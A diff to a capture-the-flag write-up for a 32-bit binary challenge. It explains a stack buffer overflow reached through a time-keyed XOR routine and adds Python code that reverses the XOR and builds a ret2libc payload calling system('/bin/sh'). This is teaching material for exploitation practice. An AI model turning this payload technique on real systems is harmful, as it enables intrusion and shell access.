@@ -23,6 +23,7 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 
 ___
 Code from Ghidra:
+
 `main()`:
 ```c
 undefined4 main(void)
@@ -79,7 +80,7 @@ void read_user_input(int xor_key)
   ```c
   chunk = malloc(160);
   ```
-* On the next snippet, the data inside the chunk is getting encrypted by the program
+* On the next snippet, the data inside the chunk is getting XOR-encoded by the program
   ```c
   for (i = 0; i < (int)len; i = i + 4) {
     for (j = 0; j < 4; j = j + 1) {
@@ -90,7 +91,7 @@ void read_user_input(int xor_key)
   }
   ```
   * going through 4 bytes block each in chunkdata
-  * then encrypt each byte with modified XOR value
+  * then encode each byte with modified XOR value
   * `xor_key` then increments after each iteration of a block
 * Next, we found a BOF bug on this line:
   ```c
@@ -133,9 +134,76 @@ with BOF, we can skip `win()` entirely, and call `system()` directly with the st
 ___
 ### Exploit:
 
-So we can put our payload into
+We can input data in `read_user_input()`:
+```c
+  chunk = malloc(160);
+  len = read(0,chunk,160);
+```
+So we can insert our payload into the chunk
 
+Then the payload will be copied entirely to buffer on the stack, which cause `stack overflow`
+```c
+memcpy(buffer,chunk,len);
+```
 
+Simple as it is, BUT the payload get `XOR'd` in between. So we have to pre-XOR the payload to reverse the operation (since XOR is symmetric: send = desired ^ key)
+
+Based on the `xor_key` creation in `main()` and the encoding operation in `read_user_input()`, we can reverse engineer the code logic:
+
+* `xor_key`:
+  ```python
+	import time
+	  
+	curr_time = int(time.time())
+	xor_key = (curr_time // 60) * 60
+  ```
+* `xor_tool`:
+  ```python
+  def xor_tool(xor_key, payload):
+	payload = bytearray(payload)
+	length = len(payload) 
+
+	for i in range(0, length, 4):
+		for j in range(0, 4):
+
+			val = xor_key >> ((j << 3) & 31)
+			val = val & 0xff
+			payload[i + j] ^= val
+
+		xor_key = xor_key + 1
+
+	return payload
+  ```
+The last thing to do is create our payload:
+```python
+# construct the payload
+offset_to_rip = 17
+payload = (b'A' * 4) * offset_to_rip  // padding to RIP
+payload += p32(system)			      // overwrite RIP -> system
+payload += p32(0xdeadbeef)			  // ret_adddr
+payload += p32(bin_sh)				  // argument: "/bin/sh"
+```
+This payload equals to calling: `system("/bin/sh")`
+
+Finally, let the script run and we have our result:
+
+* our gadgets:
+
+<img width="810" height="68" alt="image" src="https://github.com/user-attachments/assets/70362498-2598-462f-9df4-938bf238d994" />
+
+* inside heapchunk:
+
+<img width="805" height="357" alt="image" src="https://github.com/user-attachments/assets/7ae5c7ad-e676-4367-97e0-2af9f65de9fd" />
+
+* to stack (after `memcpy()`):
+
+<img width="806" height="480" alt="image" src="https://github.com/user-attachments/assets/fa2635d6-5ec4-42e2-b1a3-db61a2c65398" />
+
+* and when the program returns, we have the shell:
+
+<img width="802" height="238" alt="image" src="https://github.com/user-attachments/assets/6edde442-588a-4498-990b-ebdb7e0dac0e" />
+
+___
 Final script: `script.py`
 ```python
 from pwn import *
